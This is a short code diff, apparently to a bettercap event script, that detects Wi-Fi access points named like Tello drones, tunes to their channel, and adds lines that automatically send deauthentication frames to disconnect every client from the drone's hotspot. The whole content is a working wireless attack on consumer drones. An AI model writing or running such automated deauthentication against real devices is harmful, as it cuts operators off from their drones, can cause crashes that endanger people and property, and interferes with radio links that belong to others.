@@ -47,6 +47,8 @@ onEvent('wifi.ap.new', function(event){
     if(ap.hostname.startsWith('TELLO-')){
         log('🚁 Drone identified, homing in on channel ' + ap.channel);
         run('wifi.recon.channel ' + ap.channel);
+        log('💀 Deauthing all clients, stand by...')
+        run('wifi.deauth ' + ap.mac);
     }
 });
 
